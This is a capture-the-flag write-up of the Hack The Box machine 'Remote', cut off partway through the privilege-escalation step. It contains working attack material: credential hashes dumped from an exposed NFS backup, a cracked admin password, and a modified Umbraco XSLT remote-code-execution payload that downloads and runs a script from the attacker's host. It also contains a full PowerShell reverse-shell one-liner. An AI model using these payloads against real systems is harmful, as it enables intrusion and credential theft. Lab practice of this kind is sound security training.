# Remote

```
root@kali:/home/kali/htb/Remote# nmap -p- -sC -sV 10.129.1.153
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 09:12 EDT
Nmap scan report for 10.129.1.153
Host is up (0.027s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-18T13:13:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.78 seconds
root@kali:/home/kali/htb/Remote# 
```

I go to the webpage and see that it is running umbraco. As well as some sort of login form at http://10.129.1.153/umbraco/#/login/false?returnPath=%252Fforms

I found it by checking /contact/ 

which also said this:

```
Umbraco Forms is required to render this form.It's a breeze to install, 
all you have to do is go to the Umbraco Forms section in the back office and click Install, that's it! :) 
```

I searchsploit umbraco as well:

```
root@kali:/home/kali/htb/Remote# searchsploit umbraco
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                        | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                 | aspx/webapps/46153.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                 | php/webapps/44988.txt
--------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/Remote# 
```

So if we can get authentication, we can get RCE.


I find a todo list:

```
Here's what could be improved in the Starter Kit so far:

 

For v1:

    Use a custom grid editor for testimonials
    Integrated Analytics on pages
    Call To Action Button in the grid (with "Tag Manager" integration)
    Macro for fetching products (with friendly grid preview)
    Design Review (polish)
    Verify licenses of photos (Niels)

For vNext

    Nicer pickers of products and employees
    Custom Listview for products and employees
    Discus template on blog posts
    404 template
    Member Login/Register/Profile/Forgot password
    Update default styling of grid header
    On a Blog post -> Share/Social (tweet this / facebook this)
```

I check the source code on the form, and I find some interesting function calls. Like setPasswordSumbit(password, confirmPassword), and inviteSavePassword()

I try some of the in the console, but it doesn't work. I check /people/ and get some names.

```
Jan Skovgaard
Matt Brailsford
Lee Kelleher
Jeavon Leopold
Jeroen Breuer
```

Ok, I think I've checked out all of the website now. I think I have to find some creds to use the umbraco exploit.

The next most interesting thing for me here is the mountd on port 2049.

```
root@kali:/home/kali/htb/Remote# showmount -e 10.129.1.153
Export list for 10.129.1.153:
/site_backups (everyone)
root@kali:/home/kali/htb/Remote# 
```

ok, so we have a backup accessible for everyone.

```
root@kali:/home/kali/htb/Remote# mount -t nfs 10.129.1.153:site_backups /mnt/htb
root@kali:/home/kali/htb/Remote# ls /mnt/htb/
App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
root@kali:/home/kali/htb/Remote# 
```

I find a possible login name in App_Data/Logs/UmbracoTraceLog.remote.txt

```
App_Data/Logs/UmbracoTraceLog.remote.txt: 2020-02-20 02:38:18,746 [P4392/D2/T10] INFO  
Umbraco.Core.Security.BackOfficeSignInManager - Event Id: 0, state: 
User: admin@htb.local logged in from IP address 192.168.195.1
```
I grep for "htb.local" and find that App_Data/Umbraco.sdf has matches.


```
root@kali:/mnt/htb# strings -n 5 App_Data/Umbraco.sdf | grep "htb.local"
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/saveupdating SessionTimeout, SecurityStamp, CreateDate, UpdateDate, Id, HasIdentity
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/saveupdating Key, IsApproved, Groups, UpdateDate; groups assigned: writer
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/saveupdating Key, Groups, UpdateDate; groups assigned: writer
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <smith@htb.local>umbraco/user/saveupdating Name, Key, Groups, UpdateDate; groups assigned: writer
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "ssmith" <smith@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.1User "ssmith" <smith@htb.local>umbraco/user/sign-in/loginlogin success
User "ssmith" <smith@htb.local>192.168.195.1User "ssmith" <smith@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/saveupdating Username, Email, Key, Groups, UpdateDate; groups assigned: writer
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.137User "ssmith" <ssmith@htb.local>umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate
User "SYSTEM" 192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/saveupdating Key, Groups, UpdateDate; groups assigned: writer
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate
User "SYSTEM" 192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.137User "ssmith" <ssmith@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "ssmith" <ssmith@htb.local>umbraco/user/sign-in/loginlogin success
User "ssmith" <ssmith@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate
User "admin" <admin@htb.local>192.168.195.1umbraco/user/sign-in/failedlogin failed
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating TourData, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate
root@kali:/mnt/htb# 
```

So we have some hashes:

```
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

The admin is a sha1 hash, so I'll check that out.

```
root@kali:/home/kali/htb/Remote# echo "b8be16afba8c314ad33d812f22a04991b90e2aaa" > hash
root@kali:/home/kali/htb/Remote# john hash -wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
root@kali:/home/kali/htb/Remote# john --show hash
?:baconandcheese

1 password hash cracked, 0 left
root@kali:/home/kali/htb/Remote#  
```

I login to the website with admin@htb.local:baconandcheese

I check out the exploit from earlier and see that the payload is currently just running calc.exe on the target.

the payload looks like this:

```
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

```


so the `string cmd = "";` will be the command, and `proc.StartInfo.FileName = "calc.exe";` is what program we want to run the command in.

We can host a powershell script locally, and then run it on the target, or we could do a two stage attack, where we upload nc.exe first and then run it with the -e command.

The powershell command is faster, and we have some pre-made scripts for it. I am using the second one here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

`$client = New-Object System.Net.Sockets.TCPClient('10.10.14.51',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

```
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "-c iex(iwr http://10.10.14.51:8000/reverse.ps1 -usebasicparsing)"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.129.1.153";

```

running it:

```
root@kali:/home/kali/htb/Remote# python3 46153.py 
Start
[]

```

We can see the get request for the ps1 file:

```
root@kali:/home/kali/htb/Remote# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
10.129.1.153 - - [18/Mar/2021 11:09:03] "GET /reverse.ps1 HTTP/1.1" 200 -
```

And on the listener:

```
root@kali:/home/kali/htb/Remote# rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.1.153 49721
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv>   
```

I run ps to check processes:

```
ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
    148       9     6672      12340       0.08   1492   0 conhost                                                      
    149       9     6668      12368       0.05   3568   0 conhost                                                      
    148       9     6636      12312       0.06   4300   0 conhost                                                      
    148       9     6656      12328       6.09   5808   0 conhost                                                      
    482      19     2232       5412               400   0 csrss                                                        
    162      13     1652       4792               496   1 csrss                                                        
    254      14     4064      13608              2864   0 dllhost                                                      
    531      21    19168      37696                72   1 dwm                                                          
     49       6     1652       4300               816   1 fontdrvhost                                                  
     49       6     1520       4028               824   0 fontdrvhost                                                  
      0       0       56          8                 0   0 Idle                                                         
    198      16     8700      17592              2780   0 inetinfo                                                     
    468      27    11976      46676              5048   1 LogonUI                                                      
    944      23     5768      14592               652   0 lsass                                                        
    227      13     3076      10504              4356   0 msdtc                                                        
    597      65   117632     107792              2816   0 MsMpEng                                                      
    117      25     1948       5416              3220   0 nfssvc                                                       
    734      47   122664     133156      29.52    424   0 powershell                                                   
    559      26    78884      86584       0.64   2900   0 powershell                                                   
    622      31    76856      84020       0.61   3884   0 powershell                                                   
    742      32   118424     127948       1.83   4564   0 powershell                                                   
    622      48   149476     160488      10.14   6044   0 powershell                                                   
      0       6      224      18292               104   0 Registry                                                     
    617      35    16552      19428              2952   0 SearchIndexer                                                
    530      11     5496      10160               624   0 services                                                     
     53       3      528       1224               324   0 smss                                                         
    473      23     5852      16596              2636   0 spoolsv                                                      
    260      13     4008      11304               356   0 svchost                                                      
     85       5      900       3868               776   0 svchost                                                      
    643      15     5504      14820               800   0 svchost                                                      
    718      16     3936      10428               924   0 svchost                                                      
    232      10     1784       7012               968   0 svchost                                                      
    177       9     3000       8140              1020   0 svchost                                                      
    180      10     1964       8340              1032   0 svchost                                                      
    412      19    17460      34736              1040   0 svchost                                                      
    413      32     6820      15968              1104   0 svchost                                                      
    116       7     1316       5952              1116   0 svchost                                                      
    348      13     9916      14184              1124   0 svchost                                                      
    125       7     1272       5728              1140   0 svchost                                                      
    124      16     3524       7628              1320   0 svchost                                                      
    222      10     2620       8072              1368   0 svchost                                                      
    171       9     1664       7536              1404   0 svchost                                                      
    227      12     2464      11144              1496   0 svchost                                                      
    350      16     5376      12712              1504   0 svchost                                                      
    429       9     2876       9112              1524   0 svchost                                                      
    115       7     1224       5664              1552   0 svchost                                                      
    245      15     4048       9368              1580   0 svchost                                                      
    361      17     4820      14296              1596   0 svchost                                                      
    130       9     1356       5808              1688   0 svchost                                                      
    325      10     2716       8620              1780   0 svchost                                                      
    304      13     2072       8988              1812   0 svchost                                                      
    185      12     2044       8252              1928   0 svchost                                                      
    140       9     2232       7044              1980   0 svchost                                                      
    199      11     2004       8284              2056   0 svchost                                                      
    181      10     1800       8564              2228   0 svchost                                                      
    315      20     9560      15316              2256   0 svchost                                                      
    265      13     2608       7984              2284   0 svchost                                                      
    171      12     1840       7468              2292   0 svchost                                                      
    166      12     3928      10952              2716   0 svchost                                                      
    679      19    19180      32796              2724   0 svchost                                                      
    238      25     3464      12548              2732   0 svchost                                                      
    333      18     5180      12644              2760   0 svchost                                                      
    378      16    12236      21104              2788   0 svchost                                                      
    137       9     1640       6656              2868   0 svchost                                                      
    207      11     2388       8556              2876   0 svchost                                                      
    159       9     2736       7308              2892   0 svchost                                                      
    140       8     1460       6300              2916   0 svchost                                                      
    126       7     1252       5448              2928   0 svchost                                                      
    213      12     1856       7524              3020   0 svchost                                                      
    239      15     5348      12476              3036   0 svchost                                                      
    463      17     3532      11900              3044   0 svchost                                                      
    193      15     6160      10204              3064   0 svchost                                                      
    235      13     3428      10996              3184   0 svchost                                                      
    160      10     2048      12840              3192   0 svchost                                                      
    397      24     3452      12416              3432   0 svchost                                                      
    312      16    15792      17736              4052   0 svchost                                                      
    131       8     3104      10000              4476   0 svchost                                                      
    115       7     1264       5392              5396   0 svchost                                                      
    228      13     2764      12032              5544   0 svchost                                                      
   1562       0      192        120                 4   0 System                                                       
   1014      23     5668      19188              2944   0 TeamViewer_Service                                           
    178      12     3240      10280              2964   0 VGAuthService                                                
    122       8     1576       6420              1380   0 vmacthlp                                                     
    302      20     6096      18880              3056   0 vmtoolsd                                                     
   2285     166   498848     382520      90.41    856   0 w3wp                                                         
    175      11     1476       6992               476   0 wininit                                                      
    254      12     2760      16640               556   1 winlogon                                                     
    367      16     9608      19240              4828   0 WmiPrvSE                                                     


PS C:\windows\system32\inetsrv> 

```

And we can see that TeamViewer is running.

```
root@kali:/home/kali/htb/Remote# searchsploit teamviewer
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
TeamViewer 11 < 13 (Windows 10 x86) - Inline Hooking / Direct Memory Modificati | windows_x86/local/43366.md
TeamViewer 11.0.65452 (x64) - Local Credentials Disclosure                      | windows_x86-64/local/40342.py
TeamViewer 5.0.8232 - Remote Buffer Overflow                                    | windows/remote/34002.c
TeamViewer 5.0.8703 - 'dwmapi.dll' DLL Hijacking                                | windows/local/14734.c
TeamViewer App 13.0.100.0 - Denial of Service (PoC)                             | windows_x86-64/dos/45404.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/Remote# locate teamviewer
/usr/share/doc/metasploit-framework/modules/auxiliary/server/teamviewer_uri_smb_redirect.md
/usr/share/doc/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.md
/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/teamviewer.svg
/usr/share/icons/Flat-Remix-Blue-Dark/panel/teamviewer-indicator-away.svg
/usr/share/icons/Flat-Remix-Blue-Dark/panel/teamviewer-indicator-busy.svg
/usr/share/icons/Flat-Remix-Blue-Dark/panel/teamviewer-indicator-connected.svg
/usr/share/icons/Flat-Remix-Blue-Dark/panel/teamviewer-indicator-error.svg
/usr/share/icons/Flat-Remix-Blue-Dark/panel/teamviewer-indicator-offline.svg
/usr/share/icons/Flat-Remix-Blue-Dark/panel/teamviewer-indicator.svg
/usr/share/icons/Flat-Remix-Blue-Light/panel/teamviewer-indicator-away.svg
/usr/share/icons/Flat-Remix-Blue-Light/panel/teamviewer-indicator-busy.svg
/usr/share/icons/Flat-Remix-Blue-Light/panel/teamviewer-indicator-connected.svg
/usr/share/icons/Flat-Remix-Blue-Light/panel/teamviewer-indicator-error.svg
/usr/share/icons/Flat-Remix-Blue-Light/panel/teamviewer-indicator-offline.svg
/usr/share/icons/Flat-Remix-Blue-Light/panel/teamviewer-indicator.svg
/usr/share/metasploit-framework/modules/auxiliary/server/teamviewer_uri_smb_redirect.rb
/usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb
/usr/share/whatweb/plugins/teamviewer.rb
root@kali:/home/kali/htb/Remote# cat /usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
##

class MetasploitModule < Msf::Post
